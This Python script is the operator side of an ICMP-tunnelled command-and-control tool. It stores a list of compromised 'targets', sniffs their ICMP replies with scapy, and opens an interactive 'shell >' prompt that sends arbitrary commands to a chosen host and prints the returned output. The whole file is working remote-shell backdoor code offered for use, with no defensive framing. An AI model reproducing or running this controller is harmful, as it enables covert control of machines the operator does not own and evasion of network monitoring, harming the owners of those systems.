#!/usr/bin/python3

# self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))

from scapy.all import sniff
import base64
from shellylib import Host
from tinydb import TinyDB, Query
import os
from termcolor import colored
import sys
import time
import argparse
from multiprocessing import Process, Manager

manager = Manager()
wait = manager.Value(bool, False)

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.db = TinyDB('./db.json')
        self.mock_stdout = ""
        print(wait)

    def list_hosts(self):
        response = "[ Targets ]\n"

        targets = self.db.all()
        for target in targets:
            response += f"[*] {target['id']}\n"
            response += f" --> {target['ip']}\n"
            response += f" --> {target['status']}\n"
        
        return response

    def sniffing(self, target_ip):
        sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")

    def interact(self, target):
        global wait

        Target = Query()
        target = self.db.search(Target.id == target)[0]

        sniffer = Process(target=self.sniffing, args=(target['ip'],))
        sniffer.start()

        while True:
            if not wait:
                cmd = input(colored("shell > ", "red")).encode()
                if len(cmd) != 0:
                    self.send(target['ip'], "instruction", cmd)
                    wait = True

    def instruction(self, shellpack):
        global wait

        if shellpack['option'] == "TRUNCATED":
            self.mock_stdout += shellpack['data'].decode()
        elif shellpack['option'] == "COMPLETE":
            self.mock_stdout += shellpack['data'].decode()
            print(self.mock_stdout)
            self.mock_stdout = ""
            wait = False
        elif shellpack['option'] == "ERROR":
            print(f"[ERROR] {shellpack['data'].decode()}")
            wait = False
        else:
            print(f"{shellpack['data'].decode()}")
            wait = False
        

if __name__ == "__main__":
    controller = Controller()
    

    match sys.argv[1]:
        case "ls":
            print(controller.list_hosts())
        case "interact":
            controller.interact(int(sys.argv[2]))

            
    
    
